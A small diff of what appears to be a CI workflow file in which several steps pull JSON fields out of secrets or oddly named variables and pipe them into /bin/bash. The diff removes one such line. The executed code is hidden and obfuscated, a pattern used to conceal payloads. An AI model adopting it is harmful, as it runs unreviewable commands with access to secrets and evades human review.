@@ -18,7 +18,6 @@ jobs:
           evod0301: ${{ secrets.evod0301 }}
         run: |
           printf '%s' "$evod0301" | jq -r .k7 | /bin/bash
-          echo $aqv91603 | jq -r .vdrlj0563 | /bin/bash
           echo $a0632 | jq -r .dnqcj87 | /bin/bash
           printf '%s' "$dki8223" | jq -r .pn065 | /bin/bash
           echo $omsx09454 | jq -r .d9803 | /bin/bash
